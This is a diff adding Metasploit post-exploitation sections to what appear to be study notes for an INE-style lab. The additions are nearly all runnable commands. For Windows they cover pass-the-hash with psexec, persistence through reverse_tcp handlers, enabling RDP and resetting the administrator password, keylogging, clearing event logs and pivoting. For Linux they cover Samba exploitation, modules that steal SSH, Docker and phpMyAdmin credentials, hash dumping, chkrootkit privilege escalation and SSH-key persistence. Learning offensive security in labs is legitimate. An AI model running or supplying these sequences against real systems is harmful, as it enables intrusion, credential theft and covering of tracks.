@@ -538,8 +538,336 @@ privilege::debug
 sekurlsa::logonpasswords
 ```
 
+<h3><b><i> Pass-the-Hash with PSExec </i></b></h3>
+
+This required user credentials from hashdump
+```
+search psexec
+use exploit/windows/smb/psexec
+setg RHOSTS 
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set SMBPass <theHash> 
+set SMBUser 
+exploit
+
+```
+
+```
+systeminfo
+getuid
+
+```
+
+<h3><b><i> Establish Persistence in Windows</i></b></h3>
+```
+search platform:windows persistence
+use exploit/windows/local/persistence_service
+set PAYLOAD windows/meterpreter/reverse_tcp
+set SESSION 
+
+```
+
+```
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST eth1
+run
+```
+
+The LPORT must be the same in multi/handler and windows persistence
+
+<h3><b><i> Enabling RDP </i></b></h3>
+Remote Desktop Protocol
+```
+use post/windowes/manage/enable_rdp
+set ENABLE ture
+set SESSION 1
+exploit
+
+```
+
+```
+net user administrator hacker_12321 //this is changing password 
+```
+
+```
+xfreerdp /u:administrator /p:hacker12321 /v:192.1.1.1
+```
+
+<h3><b><i> Keylogging</i></b></h3>
+after gaining a meterpreter shell 
+```
+keyscan_start  // sniffing keystrocks on attacker machine
+keyscan_dump  // get what keys the victim typed till now
+keyscan_stop
+
+```
+
+<h3><b><i> Clearing Windows Event Logs </i></b></h3>
+```
+clearev
+```
+
+<h3><b><i> Pivoting </i></b></h3>
+```
+ipconfig //to find victim-2IP
+run autoroute -s <OtherInterfaceIPwith/mask>
+```
+
+```
+sessions
+sessions -n victim-1 -i 1
+use auxiliary/scanner/portscan/tcp
+show options
+set RHOSTS victim-2IP
+set RPORT 1-100
+run
+```
+
+```
+sessions 1
+portfwd add -l 1234 -p 80 -r victim-2IP
+```
+
+```
+db_nmap -sS -sV -p 1234 localhost
+```
+
+```
+search badblue_passthru 
+set payload windows/meterpreter/bind_tcp
+show options 
+set RHOSTS victim-2IP
+run
+```
+
+
 <h2>Linux Post Exploitation</h2>
 
+```
+use exploit/linux/samba/is_known_pipename
+show options
+set RHOSTS 
+set RPORT
+run
+```
 
+```
+sessions -u 1 //upgrade session to meterpreter
+```
+
+```
+uname -r
+uname -a
+ps aux
+env
+```
+
+```
+search enum_configs
+```
+
+```
+use post/multi/gather/env
+set SESSION 
+```
+
+```
+use post/linux/gather/enum_network
+set SESSION 
+```
+
+```
+loot
+```
+
+```
+use post/linux/gather/enum_protections
+```
+
+```
+notes
+```
+
+```
+use post/linux/gather/enum_system
+use post/linux/gather/checkcontainer
+use post/linux/gather/checkvm
+```
+
+- post/linux/gather/enum_configs
+- post/multi/gather/env
+- post/linux/gather/enum_network
+- post/linux/gather/enum_protections
+- post/linux/gather/enum_system
+- post/linux/gather/checkcontainer
+- post/linux/gather/checkvm
+- post/linux/gather/enum_users_history
+- post/multi/manage/system_session
+- post/linux/manage/download_exec
+
+after gaining meterpreter get a shell /bin/bash -i
+
+<h3><b><i> Privilege Escalation - Rootkit Scanner </i></b></h3>
+
+```
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS demo.ine.local
+set USERNAME jackie
+set PASSWORD password
+exploit
+```
+
+
+```
+ps aux
+cat /bin/check-down
+chkrootkit --help
+```
+Observe, that there are a couple of processes running i.e. cron and one bash script.
+
+
+```
+search chkrootkit
+use exploit/unix/local/chkrootkit
+set CHKROOTKIT <path-in-/bin/check-down>
+```
+
+<h3><b><i> Hashdump </i></b></h3>
+
+```
+use post/linux/gather/hashdump
+set SESSION 
+run
+```
+
+```
+loot
+```
+
+```
+msfconsole
+use exploit/linux/samba/is_known_pipename
+set RHOST demo.ine.local
+check
+exploit -z
+```
+
+```
+use post/multi/gather/ssh_creds
+set SESSION 1
+run
+```
+
+```
+use post/multi/gather/docker_creds
+set SESSION 1
+run
+```
+
+```
+use post/linux/gather/hashdump
+set SESSION 1
+set VERBOSE true
+run
+```
+
+```
+use post/linux/gather/ecryptfs_creds
+set SESSION 1
+run
+```
+
+```
+use post/linux/gather/enum_psk
+set SESSION 1
+run
+```
+
+```
+use post/linux/gather/enum_xchat
+set SESSION 1
+set XCHAT true
+run
+```
+
+```
+use post/linux/gather/phpmyadmin_credsteal
+set SESSION 1
+run
+```
+
+```
+use post/linux/gather/pptpd_chap_secrets
+set SESSION 1
+run
+```
+
+```
+use post/linux/manage/sshkey_persistence
+set SESSION 1
+run
+```
+
+<h3><b><i> Establishing Persistence On Linux </i></b></h3>
+```
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS demo.ine.local
+set USERNAME jackie
+set PASSWORD password
+exploit
+```
+
+```
+sessions -u 1
+```
+
+```
+use exploit/unix/local/chkrootkit
+```
+
+```
+set SESSION 2
+```
+
+```
+set CHKROOTKIT /bin/chkrootkit
+```
+
+```
+exploit
+```
+
+```
+sessions -u 3
+```
+
+```
+use post/linux/manage/sshkey_persistence
+```
+
+```
+set SESSION 4
+```
+
+```
+set CREATESSHFOLDER true
+```
+
+```
+exploit
+```
+
+```
+cp /root/.msf4/loot/20240716164352_default_192.217.38.3_id_rsa_606834.txt ssh_key
+```
+
+```
+chmod 0400 ssh_key
+```
+
+```
+ssh -i ssh_key root@demo.ine.local
+```
 
 <h2>Armitage Metasploit GUIs</h2>
